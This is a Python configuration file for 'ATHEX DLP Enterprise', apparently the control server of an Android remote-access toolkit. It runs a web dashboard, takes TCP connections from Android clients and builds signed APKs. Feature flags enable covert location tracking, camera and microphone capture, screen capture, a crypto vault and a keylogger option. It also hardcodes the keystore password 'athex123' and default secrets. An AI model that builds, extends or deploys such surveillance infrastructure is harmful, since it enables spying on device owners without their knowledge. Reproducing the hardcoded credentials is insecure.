"""
ATHEX DLP Enterprise - Server Configuration
============================================
Central configuration for all server components.
"""

import os
import json
from pathlib import Path
from datetime import datetime

class Config:
    """Main server configuration"""
    
    # ============================================================
    # PROJECT INFO
    # ============================================================
    PROJECT_NAME = "ATHEX DLP Enterprise"
    VERSION = "2.0.0"
    AUTHOR = "ATHEX DLP Team"
    DESCRIPTION = "Enterprise Remote Administration & Security System"
    
    # ============================================================
    # SERVER PATHS
    # ============================================================
    BASE_DIR = Path(__file__).parent.parent
    SERVER_DIR = Path(__file__).parent
    TEMPLATES_DIR = SERVER_DIR / "templates"
    STATIC_DIR = SERVER_DIR / "static"
    MODULES_DIR = SERVER_DIR / "modules"
    CORE_DIR = SERVER_DIR / "core"
    DASHBOARD_DIR = SERVER_DIR / "dashboard"
    APK_BUILDER_DIR = SERVER_DIR / "apk_builder"
    
    # Output directories
    LOGS_DIR = BASE_DIR / "logs"
    OUTPUT_DIR = BASE_DIR / "output"
    TEMP_DIR = BASE_DIR / "temp"
    DATA_DIR = BASE_DIR / "data"
    
    # ============================================================
    # NETWORK CONFIGURATION
    # ============================================================
    # Flask Web Server
    WEB_HOST = "0.0.0.0"
    WEB_PORT = 5000
    WEB_DEBUG = False
    
    # TCP Server (Android connections)
    TCP_HOST = "0.0.0.0"
    TCP_PORT = 22533
    
    # ============================================================
    # SECURITY
    # ============================================================
    SECRET_KEY = os.environ.get("ATHEX_SECRET_KEY", "athex-dlp-secret-key-change-in-production")
    JWT_SECRET = os.environ.get("ATHEX_JWT_SECRET", "jwt-secret-change-me")
    ENCRYPTION_KEY = os.environ.get("ATHEX_ENCRYPTION_KEY", "QVRI RVhfREBQX0VOQ1JZUF FJT05fS0VZXzIwMjQ=")
    AUTH_TOKEN = os.environ.get("ATHEX_AUTH_TOKEN", "athex_auth_token_2024")
    
    # ============================================================
    # CONNECTION SETTINGS
    # ============================================================
    MAX_CLIENTS = 100
    HEARTBEAT_INTERVAL = 30  # seconds
    CONNECTION_TIMEOUT = 60  # seconds
    READ_TIMEOUT = 30  # seconds
    BUFFER_SIZE = 65536  # 64KB
    MAX_MESSAGE_SIZE = 10485760  # 10MB
    
    # Reconnection
    ALLOW_RECONNECTION = True
    MAX_RECONNECT_ATTEMPTS = 10
    
    # ============================================================
    # APK BUILDER SETTINGS
    # ============================================================
    APK_TOOL_PATH = BASE_DIR / "tools" / "apktool.jar"
    SIGNER_PATH = BASE_DIR / "tools" / "uber-apk-signer.jar"
    KEYSTORE_PATH = BASE_DIR / "tools" / "athex.keystore"
    KEYSTORE_PASS = "athex123"
    KEY_ALIAS = "athex"
    KEY_PASS = "athex123"
    
    # APK Template
    APK_TEMPLATE_DIR = SERVER_DIR / "apk_builder" / "template"
    APK_OUTPUT_DIR = BASE_DIR / "output" / "apks"
    
    # ============================================================
    # LOGGING
    # ============================================================
    LOG_LEVEL = "INFO"
    LOG_FORMAT = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    LOG_FILE = LOGS_DIR / "athex_dlp.log"
    LOG_MAX_SIZE = 10485760  # 10MB
    LOG_BACKUP_COUNT = 5
    
    # ============================================================
    # DATA STORAGE
    # ============================================================
    DATABASE_PATH = DATA_DIR / "athex_dlp.db"
    NOTIFICATIONS_DB = DATA_DIR / "notifications.db"
    CLIENTS_DB = DATA_DIR / "clients.db"
    
    # ============================================================
    # FEATURE FLAGS
    # ============================================================
    ENABLE_NOTIFICATIONS = True
    ENABLE_FILE_MANAGER = True
    ENABLE_LOCATION_TRACKING = True
    ENABLE_CAMERA_CAPTURE = True
    ENABLE_MIC_RECORDING = True
    ENABLE_KEYLOGGER = False  # Requires accessibility service
    ENABLE_CRYPTO_VAULT = True
    ENABLE_SCREEN_CAPTURE = True
    
    # ============================================================
    # DASHBOARD SETTINGS
    # ============================================================
    DASHBOARD_TITLE = "ATHEX DLP Enterprise"
    DASHBOARD_REFRESH_INTERVAL = 5000  # ms
    MAX_TERMINAL_LINES = 1000
    MAX_NOTIFICATIONS_SHOWN = 50
    
    # ============================================================
    # INITIALIZATION
    # ============================================================
    
    @classmethod
    def init_directories(cls):
        """Create all required directories"""
        directories = [
            cls.LOGS_DIR,
            cls.OUTPUT_DIR,
            cls.TEMP_DIR,
            cls.DATA_DIR,
            cls.APK_OUTPUT_DIR,
            cls.STATIC_DIR / "css",
            cls.STATIC_DIR / "js",
            cls.STATIC_DIR / "assets",
        ]
        
        for directory in directories:
            directory.mkdir(parents=True, exist_ok=True)
        
        print(f"[✓] All directories initialized")
    
    @classmethod
    def print_config(cls):
        """Print current configuration"""
        config_str = f"""
╔══════════════════════════════════════════════════════════╗
║              ATHEX DLP CONFIGURATION                     ║
╠══════════════════════════════════════════════════════════╣
║  Project:     {cls.PROJECT_NAME}
║  Version:     {cls.VERSION}
║                                                        
║  Web Server:  {cls.WEB_HOST}:{cls.WEB_PORT}
║  TCP Server:  {cls.TCP_HOST}:{cls.TCP_PORT}
║                                                        
║  Max Clients: {cls.MAX_CLIENTS}
║  Buffer Size: {cls.BUFFER_SIZE}
║  Heartbeat:   {cls.HEARTBEAT_INTERVAL}s
║                                                        
║  Base Dir:    {cls.BASE_DIR}
║  Server Dir:  {cls.SERVER_DIR}
║  Logs Dir:    {cls.LOGS_DIR}
║  Data Dir:    {cls.DATA_DIR}
╚══════════════════════════════════════════════════════════╝
        """
        print(config_str)
        return config_str
    
    @classmethod
    def to_dict(cls):
        """Convert config to dictionary"""
        return {
            "project": cls.PROJECT_NAME,
            "version": cls.VERSION,
            "web_host": cls.WEB_HOST,
            "web_port": cls.WEB_PORT,
            "tcp_host": cls.TCP_HOST,
            "tcp_port": cls.TCP_PORT,
            "max_clients": cls.MAX_CLIENTS,
            "features": {
                "notifications": cls.ENABLE_NOTIFICATIONS,
                "file_manager": cls.ENABLE_FILE_MANAGER,
                "location": cls.ENABLE_LOCATION_TRACKING,
                "camera": cls.ENABLE_CAMERA_CAPTURE,
                "microphone": cls.ENABLE_MIC_RECORDING,
                "keylogger": cls.ENABLE_KEYLOGGER,
                "crypto_vault": cls.ENABLE_CRYPTO_VAULT,
                "screen_capture": cls.ENABLE_SCREEN_CAPTURE,
            }
        }

# ============================================================
# TEST
# ============================================================
if __name__ == "__main__":
    Config.init_directories()
    Config.print_config()